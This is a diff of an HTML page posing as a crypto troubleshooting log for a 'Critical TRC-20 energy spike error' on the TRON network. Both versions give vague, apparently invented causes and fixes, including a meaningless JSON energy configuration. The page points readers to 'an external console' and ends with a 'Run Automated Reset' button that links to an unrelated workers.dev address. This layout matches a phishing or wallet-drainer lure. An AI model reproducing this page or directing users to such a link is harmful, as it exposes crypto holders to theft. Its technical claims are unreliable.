@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: -apple-system;
-        background: #121214;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff9455; }
     .btn {
-        background: #ff9455;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,33 +42,35 @@
 <h1>Critical Trc 20 Energy Spike Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "Critical TRC-20 energy spike error" message when attempting to execute smart contracts or transfer tokens on the TRON network, resulting in failed transactions and potential loss of funds.</li>
+<li>The user encounters a "Critical TRC-20 energy spike error" message when attempting to transfer TRC-20 tokens on the TRON network, indicating an abnormal increase in energy consumption.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to an unexpected surge in energy consumption by TRC-20 smart contracts, exceeding the allocated energy limits and causing the transaction to fail.</li>
+<li>This error occurs due to an unexpected surge in energy usage, often caused by inefficient smart contract code or an unusually high volume of transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Adjust the <code>--energyLimit</code> parameter in the TronWeb configuration to increase the energy limit for transactions.</li>
-<li>Use the <code>tronweb.transactionBuilder</code> API to manually set the energy limit for specific transactions.</li>
-<li>Update the TRON node configuration with the following settings:</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Adjust the contract's energy parameters to optimize consumption.</li>
+<li>Implement a rate-limiting mechanism to prevent excessive transactions.</li>
+<li>Use the following JSON configuration to update the contract's settings:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;energy&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;limit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10000000</span>
+<span class="w">    </span><span class="nt">&quot;limit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10000</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;ratio&quot;</span><span class="p">:</span><span class="w"> </span><span class="mf">0.5</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced configuration options. </p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration adjustments. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>TRON node version 4.5.0 or higher</li>
-<li>TronWeb version 4.2.0 or higher</li>
-<li>A basic understanding of TRON network configuration and smart contract development</li>
+<li>Familiarity with TRON's smart contract platform</li>
+<li>Understanding of energy consumption mechanisms in TRC-20 tokens</li>
+<li>Access to the contract's source code and configuration files</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-incorrect-balance-for-aave-v3-wavax-toke.html">Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
